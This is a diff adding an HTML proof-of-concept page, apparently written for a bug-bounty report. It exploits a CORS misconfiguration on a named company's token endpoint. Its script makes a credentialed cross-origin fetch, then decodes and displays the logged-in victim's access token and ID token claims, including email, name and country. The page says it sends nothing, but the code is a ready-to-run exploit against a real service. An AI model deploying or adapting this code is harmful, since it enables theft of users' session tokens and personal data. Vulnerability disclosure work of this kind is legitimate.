@@ -1,0 +1,57 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>CORS read PoC - festo-bff-token</title>
+<style>
+ body{font:14px/1.5 ui-monospace,Menlo,Consolas,monospace;background:#101418;color:#e6edf3;margin:0;padding:24px}
+ h1{font-size:18px;margin:0 0 4px}
+ .meta{color:#8b949e;font-size:12px;margin-bottom:16px}
+ .box{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:12px;margin:10px 0;white-space:pre-wrap;word-break:break-all}
+ .ok{color:#3fb950;font-weight:700}.bad{color:#f85149;font-weight:700}
+ .k{color:#d29922}
+</style>
+</head>
+<body>
+<h1>Cross-origin credentialed read of https://www.festo.com/modules/fox/bff/token</h1>
+<div class="meta">Attacker origin: <span id="origin"></span> &middot; Intigriti researcher: ndkhai &middot; this page only renders what it reads, it stores and sends nothing.</div>
+<div class="box" id="out">running...</div>
+<script>
+document.getElementById('origin').textContent = location.origin;
+const out = document.getElementById('out');
+function show(s){ out.innerHTML = s; }
+(async () => {
+  try {
+    const r = await fetch('https://www.festo.com/modules/fox/bff/token', {credentials:'include'});
+    const t = await r.text();
+    let j = null; try { j = JSON.parse(t); } catch(e){}
+    const at = j && j.token && j.token.access_token;
+    const it = j && j.idToken;
+    function claims(tok){ try { const p = tok.split('.')[1]; return JSON.parse(atob(p.replace(/-/g,'+').replace(/_/g,'/') + '==='.slice((p.length+3)%4))); } catch(e){ return {}; } }
+    let s = '<span class="ok">HTTP ' + r.status + '</span>  read from ' + location.origin + '\n\n';
+    if (at) {
+      const c = claims(at);
+      s += '<span class="ok">ACCESS TOKEN CAPTURED</span>  length=' + at.length + '\n';
+      s += '  <span class="k">sub</span>       = ' + c.sub + '\n';
+      s += '  <span class="k">client_id</span> = ' + c.client_id + '\n';
+      s += '  <span class="k">scope</span>     = ' + c.scope + '\n';
+      s += '  <span class="k">aud</span>       = ' + JSON.stringify(c.aud) + '\n';
+      s += '  first 48 chars: ' + at.slice(0,48) + '...\n\n';
+    }
+    if (it) {
+      const c = claims(it);
+      s += '<span class="ok">ID TOKEN CAPTURED</span>  length=' + it.length + '\n';
+      s += '  <span class="k">email</span>   = ' + c.email + '\n';
+      s += '  <span class="k">name</span>    = ' + c.given_name + ' ' + c.family_name + '\n';
+      s += '  <span class="k">country</span> = ' + c.country + '\n';
+      s += '  first 48 chars: ' + it.slice(0,48) + '...\n\n';
+    }
+    if (!at && !it) s += '<span class="bad">no token in body</span> (victim not logged in?)\n\nbody: ' + t.slice(0,400);
+    show(s);
+  } catch (e) {
+    show('<span class="bad">BLOCKED</span> ' + e);
+  }
+})();
+</script>
+</body>
+</html>
